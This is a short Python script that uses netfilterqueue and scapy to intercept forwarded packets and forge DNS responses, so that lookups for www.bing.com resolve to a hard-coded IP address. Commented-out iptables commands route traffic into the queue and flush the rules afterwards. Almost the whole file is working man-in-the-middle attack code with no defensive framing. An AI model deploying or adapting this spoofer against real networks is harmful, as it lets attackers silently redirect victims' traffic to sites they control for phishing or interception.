#!/usr/bin/env python3

import netfilterqueue
import subprocess
import scapy.all as scapy

#subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = bytes(scapy_packet[scapy.DNSQR].qname)
        if "www.bing.com" in qname.decode():
            print("[+] Spoofing target")

            anwswer = scapy.DNSRR(rrname=qname, rdata="216.239.38.120")
            scapy_packet[scapy.DNS].an = anwswer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



#subprocess.call(["iptables", "--flush"])
